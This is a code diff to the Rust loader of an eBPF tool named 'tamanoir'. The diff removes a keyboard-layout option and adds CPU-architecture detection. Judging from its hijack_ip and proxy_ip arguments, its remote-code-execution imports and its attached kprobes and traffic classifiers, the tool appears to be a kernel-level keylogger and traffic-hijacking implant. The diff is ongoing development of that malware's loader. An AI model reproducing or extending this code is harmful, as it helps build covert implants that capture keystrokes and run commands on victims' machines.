@@ -1,5 +1,4 @@
-use core::str;
-use std::{net::Ipv4Addr, os::fd::AsRawFd, thread, time::Duration};
+use std::{net::Ipv4Addr, os::fd::AsRawFd, str::FromStr, thread, time::Duration};
 
 use aya::{
     programs::{tc, KProbe, SchedClassifier, TcAttachType},
@@ -9,7 +8,7 @@ use clap::Parser;
 use log::{debug, warn};
 use mio::{unix::SourceFd, Events, Interest, Poll, Token};
 use tamanoir::{rce::execute, ringbuf::RingBuffer};
-use tamanoir_common::{ContinuationByte, RceEvent};
+use tamanoir_common::{ContinuationByte, RceEvent, TargetArch};
 use tokio::signal;
 
 #[derive(Debug, Parser)]
@@ -22,9 +21,6 @@ struct Opt {
 
     #[clap(long, required = true)]
     hijack_ip: Ipv4Addr,
-
-    #[clap(long, default_value_t = 0)]
-    layout: u8,
 }
 
 #[tokio::main]
@@ -35,7 +31,6 @@ async fn main() -> anyhow::Result<()> {
         iface,
         proxy_ip,
         hijack_ip,
-        layout,
     } = Opt::parse();
 
     let rlim = libc::rlimit {
@@ -50,10 +45,11 @@ async fn main() -> anyhow::Result<()> {
     let proxy_ip = proxy_ip.to_bits();
     let hijack_ip = hijack_ip.to_bits();
 
+    let arch = TargetArch::from_str(std::env::consts::ARCH).unwrap() as u8;
     let mut ebpf = EbpfLoader::new()
         .set_global("TARGET_IP", &proxy_ip, true)
         .set_global("HIJACK_IP", &hijack_ip, true)
-        .set_global("KEYBOARD_LAYOUT", &layout, true)
+        .set_global("ARCH", &arch, true)
         .load(aya::include_bytes_aligned!(
             "../../target/bpfel-unknown-none/release/tamanoir"
         ))?;
